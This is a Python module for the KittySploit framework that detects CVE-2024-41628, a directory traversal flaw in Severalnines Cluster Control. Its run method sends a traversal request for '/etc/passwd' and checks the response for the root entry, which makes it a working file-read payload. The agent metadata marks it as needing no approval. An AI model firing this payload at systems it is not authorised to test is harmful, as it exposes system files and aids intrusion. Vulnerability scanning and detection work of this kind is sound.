#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory Traversal vulnerability in Severalnines Cluster Control 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cluster Control CMON API - Directory Traversal Detection',
        'description': 'Directory Traversal vulnerability in Severalnines Cluster Control 1.9.8 before 1.9.8-9778, 2.0.0 before 2.0.0-9779, and 2.1.0 before 2.1.0-9780 allows a remote attacker to include and display file content in an HTTP request via the CMON API.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'severalnines', 'cluster-control', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cvefeed.io/vuln/detail/CVE-2024-41628',
            'https://github.com/Redshift-CyberSecurity/CVE-2024-41628',
            'https://vuldb.com/?id.272533',
            'https://vulmon.com/vulnerabilitydetails?qid=CVE-2024-41628',
        ],
        'cve': 'CVE-2024-41628',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/../../../../../../../../..//etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Cluster Control CMON API - Directory Traversal detected', path=path)
            return True
        return False

